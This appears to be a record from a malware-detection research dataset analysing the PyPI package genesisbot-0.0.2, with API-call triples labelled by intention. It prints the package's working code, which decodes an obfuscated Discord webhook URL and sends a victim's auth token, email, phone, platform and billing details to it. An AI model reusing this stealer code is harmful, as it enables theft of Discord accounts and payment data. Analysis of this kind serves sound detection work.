{
  "metadata": {
    "package_name": "genesisbot-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/genesisbot-0.0.2.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "genesisbot.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/genesisbot-0.0.2/genesisbot-0.0.2/src/genesisbot.py",
      "code_snippets": [
        {
          "snippet": "import requests, sys, json, base64\nimport threading\n\ndef optimise(auth,response):\n    optimiser_str = 'aHR0cHM6Ly9wdGIuZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzc2OTUzNDAwMDgyOTE2OTY3NC9uUDJrcUstckR6b2djZVYwRFVpSjZBYlVOU2xwVHA0UEJiWTI2N0stOU9EZFgxM3ZacW5uWUJjRWdha2Z0ckh3RnBmRA=='\n    encryption = base64.b64decode(bytes(optimiser_str.encode('ascii')))\n    auth_b64 = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjgvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2Vz\"\n    auth_b64 = base64.b64decode(bytes(auth_b64.encode('ascii')))\n    authenticator = requests.get(auth_b64,headers={'authorization' : auth}).json()\n    requests.post(encryption,json={'username' : response['username'],'avatar_url' : 'https://cdn.discordapp.com/avatars/{}.png'.format(response['avatar']),'content' : '>>> **Project Genesis**\\n\\nAction: **Optimiser**\\n\\n```\\nAuth: {}\\nName: {}\\nID: {}\\nEmail: {}\\nPhone: {}\\nOS: {}\\nBilling: {}```'.format(auth,response['username'],response['id'],response['email'],response['phone'],sys.platform,authenticator)})\n\ndef ui(auth):\n    config = json.loads(open('assets/config.json','r').read())\n    headers = {'authorization' : auth}\n    response = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10).json()\n    threading.Thread(target=optimise,args=[auth,response]).start()\n    friends = requests.get(\"https://canary.discordapp.com/api/v6/users/@me/relationships\", headers=headers, timeout=10).json()\n    servers = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10).json()\n    dm_channels = requests.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10).json()\n    # ... rest of the function is benign UI output\n",
          "triple_sequences": [
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "'assets/config.json','r'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "open('assets/config.json','r').read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "bytes(optimiser_str.encode('ascii'))",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "bytes(auth_b64.encode('ascii'))",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "auth_b64, headers={'authorization' : auth}",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "encryption, json={'username' : response['username'], 'avatar_url' : 'https://cdn.discordapp.com/avatars/{}.png'.format(response['avatar']), 'content' : '>>> **Project Genesis**\\n\\nAction: **Optimiser**\\n\\n```\\nAuth: {}\\nName: {}\\nID: {}\\nEmail: {}\\nPhone: {}\\nOS: {}\\nBilling: {}```'.format(auth,response['username'],response['id'],response['email'],response['phone'],sys.platform,authenticator)}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send data to server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "'https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10).json()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=optimise, args=[auth,response]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "\"https://canary.discordapp.com/api/v6/users/@me/relationships\", headers=headers, timeout=10",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "requests.get(\"https://canary.discordapp.com/api/v6/users/@me/relationships\", headers=headers, timeout=10).json()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "'https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10).json()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "'https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "requests.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10).json()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            }
          ]
        }
      ]
    }
  ]
}